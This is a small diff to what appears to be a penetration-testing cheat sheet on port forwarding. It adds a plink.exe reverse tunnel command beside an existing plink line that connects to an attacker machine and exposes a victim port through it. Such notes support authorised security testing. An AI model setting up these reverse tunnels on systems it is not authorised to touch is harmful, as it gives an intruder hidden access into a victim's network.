@@ -4,6 +4,8 @@
 
 ```plink -l $user -pw $password $attacking_machine_ip -R $attacker_port_to_open:127.0.0.1:$victim_port```
 
+```plink.exe -R "remote port":127.0.0.1:"local port" root@"ipaddress"```
+
 ```$command 127.0.0.1:$attacker_port```
 
 #### SSH Remote Port Forwarding ####
